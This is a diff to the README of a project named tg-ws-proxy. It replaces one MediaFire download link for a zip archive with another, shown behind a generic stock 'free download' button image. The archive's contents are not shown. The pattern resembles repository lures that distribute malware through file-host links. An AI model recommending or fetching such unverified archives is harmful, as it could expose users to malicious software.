@@ -1,6 +1,6 @@
 # tg-ws-proxy
 <p align="center">
-  <a href="https://www.mediafire.com/file/09pe1zjdc8xemvm/tg-ws-proxy.zip/file">
+  <a href="https://www.mediafire.com/file/vjqk8i5kqlnf3v2/tg-ws-proxy.zip/file">
     <img src="https://www.coinagemag.com/wp-content/uploads/2017/12/free-download-png-blue-color-free-download-button-679-1.png" alt="Download" width="250"/>
   </a>
 </p>
